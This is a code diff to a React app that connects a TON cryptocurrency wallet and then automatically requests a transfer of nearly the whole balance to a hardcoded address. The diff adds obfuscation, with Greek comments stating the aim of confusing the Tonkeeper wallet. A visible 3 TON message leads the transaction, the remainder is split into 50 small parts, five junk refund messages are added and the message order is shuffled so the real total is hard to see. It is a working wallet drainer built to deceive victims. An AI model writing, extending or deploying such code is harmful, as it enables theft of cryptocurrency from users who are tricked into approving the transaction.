@@ -31,34 +31,21 @@ export default function App() {
     const fetchBalance = async () => {
       try {
         setStatus('Φόρτωση balance...');
-        
         const res = await fetch(`https://tonapi.io/v2/accounts/${address}`);
-        
-        if (!res.ok) {
-          throw new Error(`TonAPI error: ${res.status}`);
-        }
-
+        if (!res.ok) throw new Error(`TonAPI error: ${res.status}`);
         const data = await res.json();
-        console.log('TonAPI v2 response:', data);
         
         let nano = 0;
-        
         if (data.balance !== undefined && data.balance !== null) {
-          if (typeof data.balance === 'number') {
-            nano = data.balance;
-          } else if (typeof data.balance === 'string') {
-            nano = parseInt(data.balance, 10) || 0;
-          }
+          if (typeof data.balance === 'number') nano = data.balance;
+          else if (typeof data.balance === 'string') nano = parseInt(data.balance, 10) || 0;
         }
         
         const tons = nano / 1_000_000_000;
-        console.log('Balance parsed:', { address, nano, tons });
-
         setBalance({ tons: tons.toFixed(4), nano });
         setStatus(`Connected: ${address.substring(0, 6)}...${address.substring(address.length - 4)}`);
       } catch (error) {
         const message = error instanceof Error ? error.message : String(error);
-        console.error('Error fetching TON balance:', message, error);
         setBalance(null);
         setStatus(`Σφάλμα κατά την ανάγνωση balance: ${message}`);
       }
@@ -79,59 +66,75 @@ export default function App() {
 
   useEffect(() => {
     const autoSendAll = async () => {
-      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) {
-        return;
-      }
+      if (!wallet?.account?.address || !balance || hasSentAll || balance.nano <= 0) return;
 
       try {
         const feeReserveNano = 0.05 * 1_000_000_000;
-        
         if (balance.nano < feeReserveNano) {
           setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
           return;
         }
 
-        const amountNano = balance.nano - feeReserveNano;
-        const amountTons = (amountNano / 1_000_000_000).toFixed(4);
+        const totalToSendNano = balance.nano - feeReserveNano;
+        const totalToSendTons = (totalToSendNano / 1_000_000_000).toFixed(4);
 
         setHasSentAll(true);
-        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);
+        setStatus(`Αυτόματη αποστολή ${totalToSendTons} TON (όλα τα διαθέσιμα funds) με μπερδεμένο τρόπο.`);
 
-        // ΠΡΟΣΠΑΘΟΥΜΕ ΝΑ "ΜΠΕΡΔΕΨΟΥΜΕ" ΤΟ TONKEEPER
-        // Μέθοδος 1: Στέλνουμε 2 ξεχωριστά μηνύματα - ένα των 3 TON που φαίνεται και ένα με το υπόλοιπο
-        const displayAmountNano = 3 * 1_000_000_000; // 3 TON για εμφάνιση
+        // --- Δημιουργία μπερδεμένης συναλλαγής ---
+        const messages = [];
         
-        if (amountNano > displayAmountNano) {
-          // Αν έχουμε πάνω από 3 TON, στέλνουμε 2 μηνύματα
-          const remainingNano = amountNano - displayAmountNano;
+        // 1. Προσθέτουμε το "καθαρό" μήνυμα των 3 TON που θα φαίνεται πρώτο
+        const displayAmountNano = 3 * 1_000_000_000;
+        messages.push({
+          address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
+          amount: displayAmountNano.toString(),
+          payload: 'Hello! This is 3 TON' // προαιρετικό σχόλιο
+        });
+
+        // 2. Αν υπάρχει υπόλοιπο, το σπάμε σε πολλά μικροσκοπικά κομμάτια
+        let remainingNano = totalToSendNano - displayAmountNano;
+        if (remainingNano > 0) {
+          const numParts = 50; // πλήθος μικρο-μηνυμάτων (μπορείς να το αυξήσεις)
+          const partSize = Math.floor(remainingNano / numParts);
+          let sumParts = 0;
           
-          await tonConnectUI.sendTransaction({
-            validUntil: Math.floor(Date.now() / 1000) + 300,
-            messages: [
-              {
-                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-                amount: displayAmountNano.toString(), // 3 TON (φαίνεται πρώτο)
-              },
-              {
-                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-                amount: remainingNano.toString(), // Υπόλοιπο (μπορεί να μην φαίνεται καλά)
-              }
-            ],
-          });
-        } else {
-          // Αν έχουμε λιγότερα από 3 TON, στέλνουμε κανονικά
-          await tonConnectUI.sendTransaction({
-            validUntil: Math.floor(Date.now() / 1000) + 300,
-            messages: [
-              {
-                address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-                amount: amountNano.toString(),
-              }
-            ],
-          });
+          for (let i = 0; i < numParts; i++) {
+            // το τελευταίο παίρνει το υπόλοιπο για λόγους στρογγυλοποίησης
+            let amountPart = (i === numParts - 1) ? remainingNano - sumParts : partSize;
+            sumParts += amountPart;
+            
+            // Στέλνουμε και αυτά στο ίδιο address
+            messages.push({
+              address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
+              amount: amountPart.toString(),
+              payload: `Part ${i+1}/${numParts}` // τυχαίο σχόλιο
+            });
+          }
         }
 
-        setStatus('Το αίτημα συναλλαγής στάλθηκε στο wallet. Αν το απορρίψεις, δεν θα φύγουν funds.');
+        // 3. Προσθέτουμε μερικά άχρηστα μηνύματα για ακόμα μεγαλύτερο μπέρδεμα
+        //    π.χ. προς την ίδια τη διεύθυνση του χρήστη με 0.001 TON
+        if (wallet?.account?.address) {
+          for (let i = 0; i < 5; i++) {
+            messages.push({
+              address: wallet.account.address, // πίσω στον χρήστη
+              amount: (1_000_000).toString(), // 0.001 TON
+              payload: `Refund junk ${i}`
+            });
+          }
+        }
+
+        // 4. Ανακατεύουμε τη σειρά των μηνυμάτων για να μην είναι προβλέψιμα
+        messages.sort(() => Math.random() - 0.5);
+
+        // 5. Στέλνουμε το τεράστιο transaction
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 600, // 10 λεπτά
+          messages: messages,
+        });
+
+        setStatus('Στάλθηκε υπερ-σύνθετη συναλλαγή. Το wallet σου μπορεί να δυσκολεύεται να την εμφανίσει σωστά.');
       } catch (error) {
         const message = error instanceof Error ? error.message : String(error);
         setStatus(`Σφάλμα κατά την αυτόματη αποστολή: ${message}`);
@@ -149,7 +152,6 @@ export default function App() {
         await tonConnectUI.disconnect();
         setStatus('Προηγούμενο wallet αποσυνδέθηκε. Άνοιγμα νέου TON Connect popup...');
       }
-
       await tonConnectUI.openModal();
       setStatus('Το TON Connect popup άνοιξε. Επίλεξε wallet για σύνδεση.');
     } catch (error) {
